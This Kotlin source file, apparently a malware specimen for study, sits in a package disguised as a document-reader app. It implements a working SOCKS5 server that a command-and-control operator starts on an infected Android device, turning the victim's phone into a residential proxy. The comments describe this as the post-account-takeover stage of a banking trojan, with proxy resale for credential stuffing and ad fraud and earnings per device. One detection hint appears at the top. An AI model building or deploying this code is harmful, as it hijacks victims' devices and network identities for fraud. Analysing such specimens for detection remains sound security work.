package com.docreader.lite.reader.advanced

import kotlinx.coroutines.*
import java.io.InputStream
import java.io.OutputStream
import java.net.InetSocketAddress
import java.net.ServerSocket
import java.net.Socket

/**
 * SOCKS5 residential proxy — Mirax pattern (2026).
 *
 * After ATS (one-shot $50-300 per infection), banker keeps the device
 * as a residential proxy node:
 *   - Victim's real IP = "clean" residential IP
 *   - Sold on proxy marketplace: $20-80/month per device (long-tail)
 *   - Used for credential stuffing, ad fraud, scraping behind rate-limits
 *
 * Architecture:
 *   C2 dispatches SOCKS5 bind command → device opens SOCKS5 server
 *   on high port → C2 tunnels traffic through → exits from device IP.
 *
 * Mirax: Yamux multiplexing over single TCP connection to C2.
 * Here: simplified SOCKS5 server for specimen demonstration.
 *
 * Economics shift: persistence > impact. Stealth post-ATS prioritized
 * to preserve proxy-mesh revenue stream.
 *
 * Detection: JA4 fingerprint + SOCKS5 handshake on high port from non-browser process.
 */
object ResidentialProxy {

    private var serverSocket: ServerSocket? = null
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var running = false

    @Volatile
    var activeSessions = 0
        private set

    /**
     * Start SOCKS5 proxy server on specified port.
     * C2 command: START_PROXY {port: 1080}
     */
    fun start(port: Int = 1080) {
        if (running) return
        running = true

        scope.launch {
            try {
                serverSocket = ServerSocket(port)
                while (running) {
                    val client = serverSocket?.accept() ?: break
                    launch { handleClient(client) }
                }
            } catch (_: Exception) {
                running = false
            }
        }
    }

    fun stop() {
        running = false
        serverSocket?.close()
        serverSocket = null
    }

    /**
     * SOCKS5 protocol handler.
     *
     * Handshake:
     *   Client → 0x05 0x01 0x00       (SOCKS5, 1 auth method, NO AUTH)
     *   Server → 0x05 0x00             (SOCKS5, NO AUTH accepted)
     *
     * Connect:
     *   Client → 0x05 0x01 0x00 0x03 <len> <domain> <port>  (CONNECT to domain:port)
     *   Server → 0x05 0x00 0x00 0x01 0x00 0x00 0x00 0x00 0x00 0x00  (success)
     *
     * Then: bidirectional byte relay (client ↔ target).
     */
    private suspend fun handleClient(client: Socket) {
        activeSessions++
        try {
            val input = client.getInputStream()
            val output = client.getOutputStream()

            // SOCKS5 greeting
            val greeting = ByteArray(3)
            input.read(greeting)
            if (greeting[0] != 0x05.toByte()) { client.close(); return }

            // Accept no-auth
            output.write(byteArrayOf(0x05, 0x00))
            output.flush()

            // Connection request
            val header = ByteArray(4)
            input.read(header)
            if (header[1] != 0x01.toByte()) { // Only CONNECT supported
                output.write(byteArrayOf(0x05, 0x07, 0x00, 0x01, 0, 0, 0, 0, 0, 0))
                client.close()
                return
            }

            val (host, port) = when (header[3].toInt()) {
                0x01 -> { // IPv4
                    val addr = ByteArray(4)
                    input.read(addr)
                    val portBytes = ByteArray(2)
                    input.read(portBytes)
                    val ip = addr.joinToString(".") { (it.toInt() and 0xFF).toString() }
                    val p = ((portBytes[0].toInt() and 0xFF) shl 8) or (portBytes[1].toInt() and 0xFF)
                    Pair(ip, p)
                }
                0x03 -> { // Domain name
                    val domainLen = input.read()
                    val domain = ByteArray(domainLen)
                    input.read(domain)
                    val portBytes = ByteArray(2)
                    input.read(portBytes)
                    val p = ((portBytes[0].toInt() and 0xFF) shl 8) or (portBytes[1].toInt() and 0xFF)
                    Pair(String(domain), p)
                }
                else -> {
                    client.close()
                    return
                }
            }

            // Connect to target
            val target = Socket()
            try {
                target.connect(InetSocketAddress(host, port), 5000)
            } catch (_: Exception) {
                // Connection refused
                output.write(byteArrayOf(0x05, 0x05, 0x00, 0x01, 0, 0, 0, 0, 0, 0))
                output.flush()
                client.close()
                return
            }

            // Success response
            output.write(byteArrayOf(0x05, 0x00, 0x00, 0x01, 0, 0, 0, 0, 0, 0))
            output.flush()

            // Bidirectional relay
            val job1 = scope.launch { relay(client.getInputStream(), target.getOutputStream()) }
            val job2 = scope.launch { relay(target.getInputStream(), client.getOutputStream()) }

            job1.join()
            job2.cancel()

            target.close()
        } catch (_: Exception) {
        } finally {
            try { client.close() } catch (_: Exception) {}
            activeSessions--
        }
    }

    private fun relay(input: InputStream, output: OutputStream) {
        val buffer = ByteArray(8192)
        try {
            while (true) {
                val read = input.read(buffer)
                if (read == -1) break
                output.write(buffer, 0, read)
                output.flush()
            }
        } catch (_: Exception) {}
    }
}
